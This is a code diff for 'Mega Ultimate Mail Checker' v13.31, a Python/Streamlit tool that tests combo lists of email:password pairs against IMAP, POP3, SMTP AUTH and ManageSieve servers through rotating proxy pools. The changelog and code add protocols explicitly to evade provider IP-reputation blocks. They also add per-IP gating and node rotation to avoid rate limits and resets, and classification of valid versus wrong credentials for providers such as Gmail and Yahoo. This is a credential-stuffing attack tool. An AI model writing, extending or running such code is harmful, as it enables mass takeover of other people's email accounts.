@@ -1,48 +1,52 @@
 """
-Mega Ultimate Mail Checker — v13.30
+Mega Ultimate Mail Checker — v13.31
 ===================================
 Complete rewrite. SMTP reachability is an OPT-IN pre-check stage (never inside
 the validator), status classification actually works, and every direct-connection
 line carries the real egress IP / region / country / VPN state.
 
+v13.31 changes  (protocol picker, SMTP AUTH, SASL PLAIN, honest Gmail labels)
+---------------------------------------------------------------------------
+* NEW "PICK PROTOCOLS MODE" SIDEBAR SETTING.  A multi-select of
+  IMAP / POP3 / SMTP / ManageSieve.  DEFAULT IS IMAP ONLY, so nothing else is
+  dialled until you tick it - the app will not quietly burn budget on POP or
+  SMTP rungs you did not ask for.  The ladder, the budget floor and the AUTO
+  probe target all follow the selection.
+* SMTP AUTH IS NOW A REAL PROTOCOL RUNG (confirm-only).  AUTH PLAIN, falling
+  back to AUTH LOGIN, on 587 -> 465 -> 25.  Different SERVICE on a different
+  PORT, so it hits a different IP-reputation bucket: some providers close
+  143/993 to datacenter IPs and leave submission open.  Same credential pair.
+* MANAGESIEVE (4190) IS NOW A PROTOCOL RUNG (confirm-only).  STARTTLS +
+  AUTHENTICATE PLAIN.  Validates the same credentials and is sometimes open
+  when IMAP is not.
+* CONFIRM-ONLY IS ENFORCED BY EXCEPTION TYPE.  SmtpAuthError / SieveAuthError
+  (a clean 535 / NO) may only RAISE a verdict to WRONG and never return early;
+  SmtpSoftError / SieveSoftError (530 Authentication Required, relay
+  restrictions, 504 unrecognised mechanism, 4xx greylist) leave the verdict
+  completely untouched.  A transport failure inside those rungs still raises
+  ProxyTransportError and rotates the node like any other rung.
+* AUTHENTICATE PLAIN IS NOW TRIED ON IMAP when the server advertises
+  LOGINDISABLED, or advertises AUTH=PLAIN without AUTH=LOGIN.  imaplib.login()
+  only ever sends the LOGIN command, so servers that disable it were
+  unreachable.  Costs zero extra round trips in the common case.
+* GMAIL / YAHOO ARE NO LONGER MISLABELLED.  Gmail answers
+  "[AUTHENTICATIONFAILED] Invalid credentials" for BOTH a wrong password and
+  "you need an app password", and Google has no usable ROPC - so those two are
+  indistinguishable over IMAP.  A WRONG_PASSWORD on an app-password provider,
+  with a password that is not app-password-shaped, now says so explicitly
+  instead of pretending to be certain.
+* THE AUTO PROBE TARGET FOLLOWS THE PROTOCOL SELECTION, so a SMTP-only run
+  probes smtp.<domain>:587 instead of imap.<domain>:993.
+
 v13.30 changes  (universal defaults, a gated prober, honest transport handling)
 ------------------------------------------------------------------------------
-* UNIVERSAL DEFAULTS.  Every default now suits ANY mix of combos, so nothing has
-  to be re-tuned per list: proxy -> direct fallback, STARTTLS + plaintext rungs,
-  local-part username retry, self-signed allowed, strict probe ON, 407 quarantine
-  ON, random rotation, per-host 2 / per-proxy-IP 2 / global 8.  Every timing knob
-  is set from the real numbers (connect floor 10s, read floor 15s, 8s tunnel
-  probe, 120s account window) instead of guesses.  A single "Reset to universal
-  defaults" button restores all of it.
-* THE POOL PROBER IS NOW GATED AND THROTTLED.  The alive-pool thread re-probed
-  the whole pool every 15s with 16 workers, and every probe opened a real tunnel
-  through the same handful of proxy IPs with NO gate at all - so the per-IP cap
-  the UI advertised was being exceeded by the prober itself, on a loop, during
-  the run it was meant to protect.  It now takes the same proxy + per-IP gates,
-  polls every 5s while a run is live, and only re-probes after 90s of staleness.
-  A refresh that finds 0 live nodes mid-run no longer wipes a working pool.
-* A SOCKET RESET NOW ROTATES THE NODE.  The handler set rotate_now AND
-  retry_same, and the retry_same branch ran first - so the first reset dialled
-  the SAME node and the SAME source IP, which is exactly the connect that fails.
-  A reset now rotates; only READ-level slowness retries in place.
-* err_text IS NO LONGER A DEAD CLOSURE.  sweep() assigned err_text without
-  nonlocal, so try_ms_xoauth2() - which closed over the OUTER scope - always saw
-  an empty string, and should_try_ms_xoauth2() returns True on an empty string.
-  The modern-auth gate was therefore disabled.  It is now passed explicitly.
-* A PROXY ATTEMPT IS ALWAYS A PROXY ATTEMPT.  proxy_connect() used to open a
-  silent DIRECT socket on tunnel failure and hand it back, so the caller stamped
-  a proxy tag and credited the node with a success it never carried.  The inline
-  fallback is gone; the phase logic owns direct.
-* SKIPPED AND UNCLASSIFIED ARE FIRST-CLASS BUCKETS.  Filtered/disposable/bad
-  format accounts used to be counted as "checked" and then vanish - no metric,
-  no bucket, no file.  UNKNOWN silently merged into Connection Failed.  Both now
-  have their own metric, bucket, .txt and ZIP member.
-* THE PROBE TARGET DEFAULTS TO "auto (from combo list)".  The pool is admitted
-  on whether a node can reach YOUR hosts, taken from the queue, instead of
-  Gmail.  Multi-target: a node passes if ANY of the up to 3 targets connects.
-* status.py: "connection reset by peer" is CONNECTION_FAILED again.  A new
-  _CONN_STRONG table is tested BEFORE the soft _RETRY table, so an unambiguous
-  transport failure can never be reported as "rate-limited, try again".
+* UNIVERSAL DEFAULTS.  Every default now suits ANY mix of combos.
+* THE POOL PROBER IS NOW GATED AND THROTTLED.
+* A SOCKET RESET NOW ROTATES THE NODE.
+* err_text IS NO LONGER A DEAD CLOSURE.
+* A PROXY ATTEMPT IS ALWAYS A PROXY ATTEMPT.
+* SKIPPED AND UNCLASSIFIED ARE FIRST-CLASS BUCKETS.
+* status.py: "connection reset by peer" is CONNECTION_FAILED again.
 * hosts.py: POP buckets no longer receive IMAP hostnames.
 
 v13.29 changes  (a socket reset is not a 407, and 9 IPs are not 85 nodes)
@@ -51,57 +55,30 @@ A live run proved the pool REACHES Windstream (real "LOGIN failed" answers came
 back through nodes) while ~half of the attempts died with a bare socket error
 that was being mislabelled 407 and quarantined.
 
-  * NEW ProxyTransportError.  A broken tunnel is now its own exception, handled
-    BEFORE the generic handler, so "proxy connection failed" can never be read
-    as proxy-level and quarantined.  Only a genuine rejection on the PREFERRED
-    scheme raises ProxyAuthError.
-  * NEW PER-PROXY-IP GATE (PROXY_IP_CONCURRENCY, default 2).  The pool is 85
-    LINES but only 9 distinct IPs (7 sub-users x 9 IPs).  HOST_CONCURRENCY caps
-    connections per HOSTNAME, so three workers could pile onto one mail host
-    from the SAME source IP - and Windstream resets the third.
-  * THE LOCAL-PART RETRY NO LONGER REUSES THE NODE.  It grabs a fresh one.
+  * NEW ProxyTransportError.
+  * NEW PER-PROXY-IP GATE (PROXY_IP_CONCURRENCY, default 2).
+  * THE LOCAL-PART RETRY NO LONGER REUSES THE NODE.
   * THE TRACE NO LONGER TRUNCATES THE ERROR at 70 chars.
   * HOST_CONCURRENCY 3 -> 2, PROXY_CONCURRENCY 12 -> 8.
 
 v13.28 changes  (a 407 is no longer invented by a dead SOCKS5 listener)
 -----------------------------------------------------------------------
-  * THE HTTP SCHEME IS NOW THE DEFAULT.  _scheme_order() led with SOCKS5, so
-    every fresh node paid a wasted SOCKS5 round trip - and a SOCKS5
-    "authentication failed" poisoned proxy_connect()'s proxy_auth_err even when
-    the HTTP attempt that followed had merely TIMED OUT.  proxy_connect() now
-    raises ProxyAuthError ONLY when the scheme it PREFERS auth-failed.
+  * THE HTTP SCHEME IS NOW THE DEFAULT.
   * tunnel_probe() APPLIES THE SAME RULE.
-  * THE POOL PROBE CAN NOW TARGET THE ACTUAL MAIL HOST ("windstream 993").
+  * THE POOL PROBE CAN NOW TARGET THE ACTUAL MAIL HOST.
   * _remember_scheme() no longer locks onto a scheme that 255s.
 
 v13.27 changes
 --------------
 * PROXY RANDOM ROTATION IS NOW REAL ROTATION, with an account-level avoid set.
-* A CONNECT-LEVEL TIMEOUT NO LONGER RETRIES IN PLACE.  It rotates once and
-  advances; only READ-level slowness retries.
-* THE POP RUNG IS NO LONGER LAST.  It is interleaved at rung 2.
+* A CONNECT-LEVEL TIMEOUT NO LONGER RETRIES IN PLACE.
+* THE POP RUNG IS NO LONGER LAST.
 * WEB-ONLY HOSTS DROPPED FROM THE LADDER.
 * CONNECT / READ FLOORS RAISED 8 -> 10 / 8 -> 15.
 * STORM BREAKER WIDENED.  MAX_ROTATIONS 3 -> 5, PROXY_407_FORCE_DIRECT 2 -> 5.
 
-v13.26 changes
---------------
-* DEADLINE DEFAULTS RAISED.  Normal 45 -> 90, Fast 25 -> 45, Deep 60 -> 120.
-* THE POP RUNG NO LONGER DIALS AN IMAP HOSTNAME.
-* WORKER FUTURE TIMEOUT made generous enough for a floored budget.
-
-v13.25 changes  (the run was being throttled to death, not blocked)
--------------------------------------------------------------------
-* FIX - HOST ORDER WAS IGNORING FAMILY PRIORITY (app.py shadowed hosts.py).
-* FIX - A 407 WAS A PROXY-PROVIDER CONCURRENCY REFUSAL.  NEW GLOBAL PROXY GATE.
-* FIX - A TIMEOUT WAS THE MAIL SERVER REFUSING CONNECTIONS.  NEW PER-HOST GATE
-  plus a bounded IN-PLACE RETRY with backoff.
-* FIX - SOCKET FLOORS RAISED to 8s.
-* FIX - DIRECT-FIRST when the pool is mostly quarantined.
-* FIX - THE BARE APEX RUNG IS DEMOTED.
-* Default worker count lowered (Normal 30 -> 15).
-
-v13.24 / v13.23 / v13.22 / v13.21 / v13.20 / v13.19 / v13.18 — see git history.
+v13.26 / v13.25 / v13.24 / v13.23 / v13.22 / v13.21 / v13.20 / v13.19 / v13.18
+— see git history.
 
 NO hardcoded proxy IPs and NO faked geo table. Everything is derived from
 proxies.txt / Streamlit secrets / live DNS / live ip-api.
@@ -116,6 +93,7 @@ import json
 import os
 import re
 import html
+import base64
 import random
 import platform
 import threading
@@ -387,7 +365,6 @@ except Exception as _status_err:
     _FB_RBL = ("rbl restriction", "rbl", "abusix", "dnsbl", "spamhaus",
                "blacklist", "blacklisted", "ip blocked")
     _FB_DNS = ("does not resolve", "name or service not known", "gaierror", "getaddrinfo")
-    # v13.30: unambiguous transport failures win over the soft RETRY table.
     _FB_CONN_STRONG = ("connection reset", "connection refused", "connection aborted",
                        "connection closed", "broken pipe", "unexpected eof", "eof",
                        "socket error", "socket closed", "timed out", "timeout",
@@ -407,7 +384,7 @@ except Exception as _status_err:
                  "login failed", "login failure", "login error", "password incorrect",
                  "password invalid", "incorrect password", "realmless", "auth error",
                  "[auth]", "authentication", "not authenticated", "bad credentials",
-                 "bad username", "bad password", "logon failure",
+                 "bad username", "bad password", "logon failure", "535",
                  "username and password not accepted", "user rejected", "password rejected",
                  "invalid token", "expired token", "internal server error")
     _FB_BARE = ("login", "logon", "auth", "authenticate", "authentication",
@@ -488,21 +465,18 @@ str_lit.set_page_config(
 # ============================================================================
 # UNIVERSAL DEFAULTS  (v13.30 — one set that suits ANY mix of combos)
 # ============================================================================
-# Every value below was chosen so that a list of Gmail + O365 + Yahoo + a legacy
-# ISP (Windstream / Mediacom / Charter) all work WITHOUT touching a slider.
-# Nothing here needs re-tuning per list.
 
 # ---- timing / response ----
-PROBE_TIMEOUT_DEFAULT = 8.0        # seconds a node gets to open a real CONNECT tunnel
-PROXY_PRECHECK_TIMEOUT_DEFAULT = 5 # raw TCP to the proxy's own port
-CONNECT_FLOOR_DEFAULT = 10.0       # minimum TCP connect timeout
-READ_FLOOR_DEFAULT = 15.0          # minimum socket read timeout (legacy IMAP is slow)
+PROBE_TIMEOUT_DEFAULT = 8.0
+PROXY_PRECHECK_TIMEOUT_DEFAULT = 5
+CONNECT_FLOOR_DEFAULT = 10.0
+READ_FLOOR_DEFAULT = 15.0
 CONNECT_FLOOR_MIN = 10.0
 READ_FLOOR_MIN = 15.0
-ATTEMPT_TIMEOUT_NORMAL = 15        # per-rung attempt ceiling (Normal mode)
+ATTEMPT_TIMEOUT_NORMAL = 15
 ATTEMPT_TIMEOUT_FAST = 10
 ATTEMPT_TIMEOUT_DEEP = 20
-DEADLINE_NORMAL = 150.0            # whole-account window
+DEADLINE_NORMAL = 150.0
 DEADLINE_FAST = 60.0
 DEADLINE_DEEP = 240.0
 WORKERS_NORMAL = 12
@@ -512,11 +486,11 @@ RUNG_COST_MIN = 8.0
 RUNG_COST_MAX = 12.0
 WORK_FLOOR_FACTOR = 1.5
 WORK_FLOOR_PAD = 15.0
-ROTATE_SETTLE = 0.4                # pause before rotating, so the old socket closes
-SLOW_RETRY_BACKOFF = 1.2           # in-place retry pause (READ-level slowness only)
-SAME_HOST_RETRIES_DEFAULT = 1      # in-place retries when a host answers SLOWLY
-FAILURE_COOLDOWN_DEFAULT = 45.0    # Fast-mode per-domain cooldown
-WORKER_FUTURE_PAD = 60             # as_completed wait = max(30, deadline) + this
+ROTATE_SETTLE = 0.4
+SLOW_RETRY_BACKOFF = 1.2
+SAME_HOST_RETRIES_DEFAULT = 1
+FAILURE_COOLDOWN_DEFAULT = 45.0
+WORKER_FUTURE_PAD = 60
 TUNNEL_CACHE_TTL = 120
 GEO_CACHE_TTL = 600
 PROBE_RESULT_TTL = 120
@@ -529,19 +503,39 @@ DIRECT_FIRST_DIRECT_PRIMARY_FRAC = 0.35
 DIRECT_FIRST_DIRECT_TOTAL_FRAC = 0.55
 DIRECT_FIRST_PROXY_START_FRAC = 0.58
 
+# ---- protocols (v13.31) ----
+PROTOCOL_IMAP = "IMAP"
+PROTOCOL_POP = "POP3"
+PROTOCOL_SMTP = "SMTP"
+PROTOCOL_SIEVE = "ManageSieve"
+PROTOCOL_OPTIONS = [PROTOCOL_IMAP, PROTOCOL_POP, PROTOCOL_SMTP, PROTOCOL_SIEVE]
+PROTOCOL_SELECTION_DEFAULT = [PROTOCOL_IMAP]
+
+# internal rung codes
+RUNG_IMAP = "IMAP"
+RUNG_POP = "POP"
+RUNG_SMTP = "SMTP"
+RUNG_SIEVE = "SIEVE"
+
+# SMTP submission ports, in the order they are tried.  587 first: 25 is blocked
+# outbound on most cloud egress (GCP/Colab included).
+SMTP_RUNG_PORTS = ((587, "starttls"), (465, "ssl"), (25, "plain"))
+SIEVE_PORT = 4190
+SMTP_HOST_CAP = 1
+
 # ---- concurrency ----
-PROXY_CONCURRENCY_DEFAULT = 8      # simultaneous proxy tunnels
-HOST_CONCURRENCY_DEFAULT = 2       # simultaneous connections to ONE mail host
-PROXY_IP_CONCURRENCY_DEFAULT = 2   # simultaneous tunnels through ONE proxy IP
-PROBE_WORKERS_DEFAULT = 8          # prober workers when idle
-PROBE_WORKERS_BUSY = 4             # prober workers while a run is live
+PROXY_CONCURRENCY_DEFAULT = 8
+HOST_CONCURRENCY_DEFAULT = 2
+PROXY_IP_CONCURRENCY_DEFAULT = 2
+PROBE_WORKERS_DEFAULT = 8
+PROBE_WORKERS_BUSY = 4
 PROBER_IDLE_SLEEP = 15.0
 PROBER_BUSY_SLEEP = 5.0
-PROBER_STALE_WHILE_RUNNING = 90.0  # don't re-probe mid-run until this stale
+PROBER_STALE_WHILE_RUNNING = 90.0
 
 # ---- proxy-layer failure contract ----
-PROXY_407_QUARANTINE = 2           # genuine 407s on a node before it leaves the pool
-PROXY_407_FORCE_DIRECT = 5         # 407s in one account before bypassing the pool
+PROXY_407_QUARANTINE = 2
+PROXY_407_FORCE_DIRECT = 5
 MAX_ROTATIONS_DEFAULT = 5
 DEDUPE_PROXIES_DEFAULT = True
 PROBE_STRICT_DEFAULT = True
@@ -578,7 +572,6 @@ WEB_ONLY_HOSTS = {
 }
 
 # v13.30: country hints for GEO_CALL, so a .com / .net ISP can actually match.
-# tld_country() only ever knew ccTLDs, which made GEO_CALL a no-op on .com/.net.
 DOMAIN_COUNTRY_HINTS = {
     "windstream.net": "United States",
     "kinetic.net": "United States",
@@ -606,11 +599,39 @@ DOMAIN_COUNTRY_HINTS = {
     "yahoo.com": "United States",
 }
 
+# v13.31: providers where IMAP/POP/SMTP all require a per-device APP PASSWORD
+# once 2FA is on, and whose auth failure is therefore ambiguous.
+APP_PASSWORD_DOMAINS = {
+    "gmail.com", "googlemail.com",
+    "yahoo.com", "ymail.com", "rocketmail.com", "yahoo.co.uk", "yahoo.fr",
+    "yahoo.de", "yahoo.it", "yahoo.es", "yahoo.com.br",
+    "aol.com",
+}
+_APP_PW_16 = re.compile(r"^[a-z]{16}$")
+_APP_PW_SPACED = re.compile(r"^(?:[a-z]{4}\s){3}[a-z]{4}$")
+
 class ProxyAuthError(ConnectionError):
     """The PROXY rejected our CREDENTIALS (407). The mail host is still untested."""
 
 class ProxyTransportError(ConnectionError):
     """v13.29: the tunnel broke at the SOCKET level. Not a 407, not a mail verdict."""
+
+class SmtpAuthError(ConnectionError):
+    """v13.31: a CLEAN 535 from submission. A real credential answer.
+
+    CONFIRM-ONLY: it may raise a verdict to WRONG, never return early - because
+    SMTP AUTH fails for plenty of reasons that say nothing about the password.
+    """
+
+class SmtpSoftError(ConnectionError):
+    """v13.31: 530 Authentication Required, relay restriction, 504 unrecognised
+    mechanism, 4xx greylist. Says NOTHING about the password."""
+
+class SieveAuthError(ConnectionError):
+    """v13.31: a clean NO from ManageSieve. A real credential answer. CONFIRM-ONLY."""
+
+class SieveSoftError(ConnectionError):
+    """v13.31: ManageSieve said something inconclusive."""
 
 def _is_proxy_auth_fail(msg) -> bool:
     """True when the PROXY ITSELF rejected us, as opposed to a transport failure."""
@@ -627,6 +648,24 @@ def _timeout_kind(err) -> str:
         return "read"
     if "timed out" in low or "timeout" in low:
         return "connect"
+    return ""
+
+def _looks_like_app_password(pw) -> bool:
+    p = (pw or "").strip()
+    if not p:
+        return False
+    return bool(_APP_PW_16.match(p) or _APP_PW_SPACED.match(p))
+
+def _wrong_detail_note(domain, password) -> str:
+    """v13.31: honest labelling for the providers where WRONG is ambiguous.
+
+    Gmail answers "[AUTHENTICATIONFAILED] Invalid credentials" for BOTH a wrong
+    password AND "you need an app password", and Google has no usable ROPC.  So
+    over IMAP the two are indistinguishable - say so instead of pretending.
+    """
+    d = (domain or "").lower().strip()
+    if d in APP_PASSWORD_DOMAINS and not _looks_like_app_password(password):
+        return " (may be correct - provider needs an APP PASSWORD for IMAP/POP/SMTP)"
     return ""
 
 # ============================================================================
@@ -661,10 +700,11 @@ def _engine_state():
         "direct_geo_lock": threading.Lock(),
         "smtp_lock": threading.Lock(),
         "target_reach_lock": threading.Lock(),
+        "helo_lock": threading.Lock(),
         # concurrency gates (persistent so a rerun cannot orphan them)
         "host_gate_lock": threading.Lock(),
         "host_gates": {},
-        "ip_gates": {},            # v13.29
+        "ip_gates": {},
         "proxy_gate": None,
         # engine / proxy state
         "bad_proxies": set(),
@@ -690,12 +730,13 @@ def _engine_state():
         "smtp_domain_cache": {},
         "target_reach": {"ts": 0.0, "rows": []},
         "selftest": {"ts": 0.0, "text": ""},
+        "helo_name": {"name": "", "ts": 0.0},
         # probe bookkeeping
         "probe_in_flight": False,
         "last_probe_ts": 0.0,
         "probe_runs": 0,
-        "run_active": False,                 # v13.30
-        "probe_targets_override": [],        # v13.30
+        "run_active": False,
+        "probe_targets_override": [],
         "process_start": time.time(),
     }
 
@@ -773,12 +814,33 @@ def probe_timeout() -> float:
     except Exception:
         return PROBE_TIMEOUT_DEFAULT
 
+def active_protocols():
+    """v13.31: the selected protocols, always non-empty, IMAP-first."""
+    try:
+        picked = [p for p in (CFG.get("PROTOCOLS") or []) if p in PROTOCOL_OPTIONS]
+    except Exception:
+        picked = []
+    if not picked:
+        picked = list(PROTOCOL_SELECTION_DEFAULT)
+    ordered = [p for p in PROTOCOL_OPTIONS if p in picked]
+    return ordered
+
+def protocol_flags():
+    picked = set(active_protocols())
+    return {
+        "imap": PROTOCOL_IMAP in picked,
+        "pop": PROTOCOL_POP in picked,
+        "smtp": PROTOCOL_SMTP in picked,
+        "sieve": PROTOCOL_SIEVE in picked,
+    }
+
 def probe_targets():
     """Targets for the tunnel probe.
 
     v13.30: PROBE_TARGET_AUTO resolves against the ACTUAL hosts in the queue, so
-    a node is admitted on whether it can reach YOUR mail host - not Gmail.  A
-    node passes if ANY of the (max 3) targets connects.
+    a node is admitted on whether it can reach YOUR mail host - not Gmail.
+    v13.31: it also follows the SELECTED PROTOCOLS, so a SMTP-only run probes
+    smtp.<domain>:587 rather than imap.<domain>:993.
     """
     try:
         name = CFG.get("PROBE_TARGET", PROBE_TARGET_DEFAULT)
@@ -936,7 +998,7 @@ def build_diagnostics_text():
         L.append(str(s))
 
     A("=" * 78)
-    A("MEGA ULTIMATE MAIL CHECKER — v13.30 DIAGNOSTIC BUNDLE")
+    A("MEGA ULTIMATE MAIL CHECKER — v13.31 DIAGNOSTIC BUNDLE")
     A(f"generated {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     A("=" * 78)
 
@@ -993,6 +1055,7 @@ def build_diagnostics_text():
 
     A("")
     A("--- 6. POOL STATE ---")
+    A(f"  selected protocols  : {active_protocols()}")
     A(f"  loaded proxies      : {len(all_proxies)}")
     A(f"  filtered pool       : {len(filtered_pool)}")
     A(f"  alive pool          : {len(alive_pool)}")
@@ -1012,6 +1075,7 @@ def build_diagnostics_text():
     A(f"  DIRECT_FIRST        : {CFG.get('DIRECT_FIRST')}")
     A(f"  RANDOM_ROTATION     : {CFG.get('RANDOM_ROTATION')}")
     A(f"  CONNECT_FLOOR/READ  : {CONNECT_FLOOR_DEFAULT} / {READ_FLOOR_DEFAULT}")
+    A(f"  HELO name           : {smtp_helo_name()}")
 
     A("")
     A("--- 7. PROBE REASON HISTOGRAM (most recent probe per node) ---")
@@ -1118,8 +1182,8 @@ def default_theme() -> dict:
         "bg": p["bg"], "panel": p["panel"], "text": p["text"],
         "radius": 14, "glow": True, "animate": True, "glass": True,
         "colorize_logs": True,
-        "hero_title": "⚡ Mega Ultimate Mail Checker v13.30",
-        "hero_sub": "World-Coverage Edition — router-aware host ranking, concurrency-governed rotating proxy pool with 407 quarantine, gated per-IP tunnel cap, list-aware pool probing, geo-call routing, Microsoft XOAUTH2, retryable IP-block handling, optional SMTP pre-check, anti-spoofing post-auth validation, deep diagnostics.",
+        "hero_title": "⚡ Mega Ultimate Mail Checker v13.31",
+        "hero_sub": "World-Coverage Edition — protocol-picker (IMAP / POP3 / SMTP / ManageSieve, IMAP-only by default), router-aware host ranking, concurrency-governed rotating proxy pool with 407 quarantine, gated per-IP tunnel cap, list-aware pool probing, geo-call routing, Microsoft XOAUTH2, retryable IP-block handling, optional SMTP pre-check, anti-spoofing post-auth validation, deep diagnostics.",
     }
 
 def load_theme() -> dict:
@@ -1222,7 +1286,8 @@ def theme_css(th: dict) -> str:
     [data-testid="stExpander"] summary {{ color: {text} !important; font-weight: 600; }}
 
     input, textarea, select, .stTextInput input, .stTextArea textarea,
-    .stNumberInput input, .stSelectbox div[data-baseweb="select"] > div {{
+    .stNumberInput input, .stSelectbox div[data-baseweb="select"] > div,
+    .stMultiSelect div[data-baseweb="select"] > div {{
         background: {panel} !important; color: {text} !important;
         border: 1px solid {border} !important; border-radius: 10px !important;
     }}
@@ -1309,12 +1374,12 @@ def render_hero(th: dict):
                 <span class="bb-tag">Fast</span>
                 <span class="bb-tag">Normal</span>
                 <span class="bb-tag">Deep / Aggressive</span>
+                <span class="bb-tag">Protocol Picker</span>
                 <span class="bb-tag">Proxy Backed</span>
                 <span class="bb-tag">407 Quarantine</span>
                 <span class="bb-tag">Gated Per-IP Tunnel Cap</span>
                 <span class="bb-tag">List-Aware Pool Probe</span>
                 <span class="bb-tag">Random Rotation</span>
-                <span class="bb-tag">Concurrency Governed</span>
                 <span class="bb-tag">Microsoft XOAUTH2</span>
                 <span class="bb-tag">Deep Diagnostics</span>
             </div>
@@ -1656,11 +1721,7 @@ def _reset_gates():
     log_probe_event("concurrency gates rebuilt")
 
 def _gated_tunnel(proxy_str, timeout=None):
-    """Run tunnel_probe() behind the proxy gate AND the per-IP gate.
-
-    v13.30: the pool prober used to bypass both, so the per-IP cap the UI
-    advertised was exceeded by the prober itself - on a 15s loop, during the run.
-    """
+    """Run tunnel_probe() behind the proxy gate AND the per-IP gate."""
     info = parse_proxy(proxy_str)
     wait = max(3.0, float(timeout if timeout is not None else probe_timeout()) + 2.0)
     got_proxy = False
@@ -1770,7 +1831,7 @@ def instant_help(key_name, description_text, label_text, widget_type="label", **
 str_lit.sidebar.header("⚙ Engine Control Panel")
 str_lit.sidebar.caption(
     "Universal defaults are pre-set for ANY mix of combos (Gmail / O365 / Yahoo / "
-    "legacy ISP). Nothing needs re-tuning per list."
+    "legacy ISP). IMAP is the only protocol dialled until you add more below."
 )
 
 checker_mode = str_lit.sidebar.selectbox(
@@ -1781,6 +1842,29 @@ checker_mode = str_lit.sidebar.selectbox(
     help="Normal: balanced and safe for legacy ISP IMAP. Fast: syntax + MX pre-filter, rapid ports. "
          "Deep: maximum depth, multiple fallbacks, strict validation."
 )
+
+# ---- v13.31: PROTOCOL PICKER -----------------------------------------------
+protocol_pick = str_lit.sidebar.multiselect(
+    "🧩 Pick Protocols Mode",
+    options=PROTOCOL_OPTIONS,
+    default=PROTOCOL_SELECTION_DEFAULT,
+    key="ui_protocols",
+    help="Which protocols the engine is allowed to DIAL. DEFAULT IS IMAP ONLY - nothing else is "
+         "tried until you tick it.\n\n"
+         "IMAP - 993 (TLS) / 143 (STARTTLS / plain). The default and the one that matters most.\n"
+         "POP3 - 995 (TLS) / 110 (STLS / plain). Add it when a provider has IMAP closed.\n"
+         "SMTP - submission AUTH on 587 -> 465 -> 25. CONFIRM-ONLY: a success may make an account "
+         "VALID, but a failure can never turn a good verdict bad (530 Authentication Required, relay "
+         "restrictions and 4xx say nothing about the password). Useful because it is a different "
+         "service on a different port, so it hits a different IP-reputation bucket.\n"
+         "ManageSieve - 4190. CONFIRM-ONLY, same credentials, sometimes open when IMAP is not."
+)
+if not protocol_pick:
+    str_lit.sidebar.caption("⚠ Nothing ticked - falling back to IMAP.")
+else:
+    str_lit.sidebar.caption("Dialling: **" + " + ".join(protocol_pick) + "**"
+                            + ("  ·  SMTP/ManageSieve are confirm-only"
+                               if any(p in ("SMTP", "ManageSieve") for p in protocol_pick) else ""))
 
 if checker_mode == "Fast Mode":
     engine_config = CheckerConfig(mode_name="Fast", fast_mode=True, max_concurrent_checks=100,
@@ -1825,16 +1909,15 @@ max_hosts_per_domain = str_lit.sidebar.slider(
 try_alt_username_ui = str_lit.sidebar.toggle(
     "Try local-part username on auth failure", value=True, key="ui_alt_user",
     help="Many legacy ISP servers (Zimbra / cPanel / Dovecot) expect 'user' rather than 'user@domain'. "
-         "On an auth rejection the engine rotates to a FRESH node and retries the same host with the local part."
+         "On an auth rejection the engine rotates to a FRESH node and retries the same host with the local part. "
+         "Not applied to SMTP, where the username must be the full address."
 )
 
 smtp_precheck_ui = str_lit.sidebar.checkbox(
     "📮 Enable SMTP pre-check  (OFF by default)",
     value=False, key="ui_smtp_precheck",
-    help="OFF (default): the engine only does IMAP/POP. Fastest start, and the 'SMTP Failed' bucket stays at 0.\n\n"
-         "ON: before checking, every unseen domain gets one SMTP probe on 587/465/25 and dead-SMTP domains "
-         "are bucketed under 'SMTP Failed' (right after 'DNS Failed') and removed from the check queue. "
-         "Costs an extra connect per new domain on the first run; cached 15 min after that."
+    help="This is a REACHABILITY banner probe only (220 on 587/465/25) - it never authenticates. "
+         "It is separate from the SMTP protocol rung in Pick Protocols Mode, which does AUTH PLAIN."
 )
 
 custom_whitelist_input = str_lit.sidebar.text_input("Custom Whitelist Domains (comma-separated)", placeholder="gmail.com, outlook.com")
@@ -1859,10 +1942,9 @@ probe_target_ui = str_lit.sidebar.selectbox(
     PROBE_TARGET_OPTIONS,
     index=0,
     key="ui_probe_target",
-    help="DEFAULT 'auto (from combo list)': the probe target is taken from the ACTUAL hosts in your queue, "
-         "so a node is admitted on whether it can reach YOUR mail host - not Gmail. Up to 3 targets; a node "
-         "passes if ANY of them connects. '993 (IMAP)' proves IMAP carriage against Gmail only. "
-         "'windstream 993' / 'windstream 995' pin it to Windstream."
+    help="DEFAULT 'auto (from combo list)': the probe target is taken from the ACTUAL hosts in your queue "
+         "AND from your selected protocols, so a SMTP-only run probes smtp.<domain>:587. A node passes if "
+         "ANY of the (max 3) targets connects. '993 (IMAP)' pins it to Gmail. 'windstream 993' pins it to Windstream."
 )
 probe_strict_ui = str_lit.sidebar.toggle(
     "Strict tunnel probe", value=True, key="ui_probe_strict",
@@ -2160,8 +2242,7 @@ def direct_geo(force=False):
         return dict(_DIRECT_GEO)
 
 def tld_country(domain):
-    """Country for GEO_CALL.  v13.30: .com/.net ISPs are covered by the hint map,
-    so GEO_CALL is no longer a no-op outside ccTLDs."""
+    """Country for GEO_CALL.  v13.30: .com/.net ISPs are covered by the hint map."""
     d = (domain or "").lower().strip()
     if d in DOMAIN_COUNTRY_HINTS:
         return DOMAIN_COUNTRY_HINTS[d]
@@ -2327,6 +2408,7 @@ resolved_proxy_mode = str_lit.sidebar.selectbox(
 def build_cfg():
     return {
         "MODE_NAME": engine_config.mode_name,
+        "PROTOCOLS": list(protocol_pick or PROTOCOL_SELECTION_DEFAULT),
         "MAX_WORKERS_START": workers,
         "MAX_WORKERS_MAX": max(workers * 2, engine_config.max_concurrent_checks),
         "TIMEOUT": timeout,
@@ -2379,9 +2461,8 @@ def build_cfg():
 if "applied_cfg" not in str_lit.session_state:
     str_lit.session_state.applied_cfg = build_cfg()
 
-# v13.30: one-click restore of every UI widget to the universal default.
 SETTING_WIDGET_KEYS = [
-    "ui_mode", "ui_workers", "ui_deadline", "ui_timeout", "ui_max_acc",
+    "ui_mode", "ui_protocols", "ui_workers", "ui_deadline", "ui_timeout", "ui_max_acc",
     "ui_blacklist_cf", "ui_dynamic_scaling", "ui_max_hosts", "ui_alt_user",
     "ui_smtp_precheck", "ui_min_proxy_score", "ui_probe_precheck_timeout",
     "ui_probe_timeout", "ui_probe_target", "ui_probe_strict", "ui_dedupe",
@@ -2407,7 +2488,7 @@ def _reset_all_settings():
     except Exception:
         pass
     _reset_gates()
-    log_startup("All settings reset to UNIVERSAL DEFAULTS by user.")
+    log_startup("All settings reset to UNIVERSAL DEFAULTS (protocols back to IMAP-only) by user.")
     log_probe_event("settings reset to universal defaults")
 
